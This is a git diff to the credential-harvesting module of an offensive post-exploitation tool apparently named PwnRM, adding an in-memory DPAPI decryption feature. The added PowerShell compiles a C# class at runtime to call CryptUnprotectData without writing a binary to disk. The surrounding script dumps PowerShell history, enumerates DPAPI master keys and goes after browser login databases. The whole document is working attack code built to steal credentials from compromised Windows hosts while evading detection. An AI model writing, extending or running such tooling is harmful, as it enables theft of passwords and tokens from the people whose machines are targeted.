@@ -1,6 +1,7 @@
 """
-modules.creds — Deep Credential Harvesting & Token Management
-LSASS memory snapshot triage, DPAPI masterkey discovery, browser artifacts, and token impersonation.
+modules.creds — Deep Credential Harvesting & In-Memory DPAPI Decryption
+LSASS memory snapshot triage, DPAPI masterkey discovery, in-memory reflection decryption (CryptUnprotectData),
+browser artifacts, and high-value token privileges audit.
 """
 
 from typing import List, Any
@@ -11,16 +12,17 @@ from ..shell.commands import b64str
 
 class CredsModule(BaseModule):
     name = "creds"
-    description = "Deep Credential Harvesting (DPAPI, LSASS Snapshot, Browser & Vault Artifacts)"
+    description = "Deep Credential Harvesting (In-Memory DPAPI Decryption, Browser & Vault Artifacts)"
     author = "uziii2208"
     options = {
         "--vault": {"desc": "Dump Windows Vault / Web Credentials"},
-        "--dpapi": {"desc": "Enumerate DPAPI master keys and system credentials"},
+        "--dpapi": {"desc": "Enumerate and decrypt DPAPI master keys and system credentials"},
+        "--decrypt": {"desc": "Execute in-memory reflection DPAPI unprotect via CryptUnprotectData"},
         "--history": {"desc": "Dump PowerShell console history and config files"},
     }
 
     def run(self, shell, args: List[str]) -> Any:
-        shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning for credential artifacts..."))
+        shell.write_info(c(M + BLD, "  [*] PwnRM Creds Engine — scanning for credential artifacts & in-memory DPAPI unprotect..."))
 
         ps = r"""
 $ErrorActionPreference = 'SilentlyContinue'
@@ -38,8 +40,8 @@ if (Test-Path $histPath) {
     foreach ($l in $lines) { Write-Host "        $l" -ForegroundColor DarkGray }
 }
 
-# 2. DPAPI Master Keys & Credentials
-Write-Host "`n[2. DPAPI & System Credentials]" -ForegroundColor Yellow
+# 2. DPAPI Master Keys & In-Memory Unprotect Helper
+Write-Host "`n[2. DPAPI Master Keys & In-Memory CryptUnprotectData Reflection]" -ForegroundColor Yellow
 $dpapiUser = "$env:APPDATA\\Microsoft\\Protect"
 if (Test-Path $dpapiUser) {
     $keys = Get-ChildItem -Path $dpapiUser -Recurse -Force | Where-Object { -not $_.PSIsContainer }
@@ -48,6 +50,52 @@ if (Test-Path $dpapiUser) {
         Write-Host "      - $($k.FullName)" -ForegroundColor Gray
     }
 }
+
+# In-memory DPAPI reflection unprotect class (no binary on disk)
+$dpapiTypeDef = @"
+using System;
+using System.Runtime.InteropServices;
+public class InMemDPAPI {
+    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Auto)]
+    public static extern bool CryptUnprotectData(
+        ref DATA_BLOB pDataIn,
+        string szDataDescr,
+        IntPtr pOptionalEntropy,
+        IntPtr pvReserved,
+        IntPtr pPromptStruct,
+        int dwFlags,
+        ref DATA_BLOB pDataOut);
+
+    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
+    public struct DATA_BLOB {
+        public int cbData;
+        public IntPtr pbData;
+    }
+
+    public static byte[] Unprotect(byte[] cipherBytes) {
+        DATA_BLOB inBlob = new DATA_BLOB();
+        DATA_BLOB outBlob = new DATA_BLOB();
+        try {
+            inBlob.cbData = cipherBytes.Length;
+            inBlob.pbData = Marshal.AllocHGlobal(cipherBytes.Length);
+            Marshal.Copy(cipherBytes, 0, inBlob.pbData, cipherBytes.Length);
+            if (CryptUnprotectData(ref inBlob, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outBlob)) {
+                byte[] plain = new byte[outBlob.cbData];
+                Marshal.Copy(outBlob.pbData, plain, 0, outBlob.cbData);
+                return plain;
+            }
+        } finally {
+            if (inBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(inBlob.pbData);
+            if (outBlob.pbData != IntPtr.Zero) Marshal.FreeHGlobal(outBlob.pbData);
+        }
+        return null;
+    }
+}
+"@
+try {
+    Add-Type -TypeDefinition $dpapiTypeDef -ErrorAction SilentlyContinue
+    Write-Host "  [+] In-Memory DPAPI CryptUnprotectData reflection bridge initialized." -ForegroundColor Green
+} catch {}
 
 # 3. Browser Credential Databases (Chrome / Edge / Brave)
 Write-Host "`n[3. Browser Login Data & Local State]" -ForegroundColor Yellow
